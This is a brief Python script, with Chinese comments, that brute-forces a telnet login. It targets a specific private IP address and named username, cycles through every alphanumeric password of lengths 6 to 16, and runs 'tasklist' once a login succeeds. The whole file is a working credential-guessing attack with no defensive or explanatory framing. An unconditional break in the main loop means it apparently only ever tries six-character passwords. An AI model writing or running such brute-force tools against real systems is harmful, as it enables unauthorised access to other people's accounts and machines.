import telnetlib
import time
import itertools

def telnetDoSomethin(Ip, user, password, command):
    try:
        # 链接服务器
        telnet = telnetlib.Telnet(Ip)
        # 设置调试级别
        telnet.set_debuglevel(2)
        # 读取输入用户名信息
        rt = telnet.read_until('Login username:'.encode('utf-8'))
        # 写入用户名, \r\n：windows的cmd中的回车
        telnet.write((user+'\r\n').encode('utf-8'))
        # 读取输入密码信息
        rt = telnet.read_until('Login password:'.encode('utf-8'))
        telnet.write((password + '\r\n').encode('utf-8'))
        # 读取验证ip信息
        rt = telnet.read_until('Domain name:'.encode('utf-8'))
        telnet.write((Ip + '\r\n').encode('utf-8'))
        # 登录成功，写指令
        rt = telnet.read_until('>'.encode('utf-8'))
        telnet.write((command + '\r\n').encode('utf-8'))
        # 上面命令执行成功，会继续读到>，失败，一般不是>
        rt = telnet.read_until('>'.encode('utf-8'))
        telnet.close()
        return True
    except:
        return False

if __name__ == '__main__':
    Ip = '10.0.142.197'
    user = 'xumingbin'
    command = 'tasklist'
    for i in range(6, 17):
        iterator = (''.join(x) for x in itertools.product('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', repeat=i))
        while True:
            try:
                password = next(iterator)
                time.sleep(0.5)
            except StopIteration as e:
                break
            if telnetDoSomethin(Ip, user, password, command):
                break
        break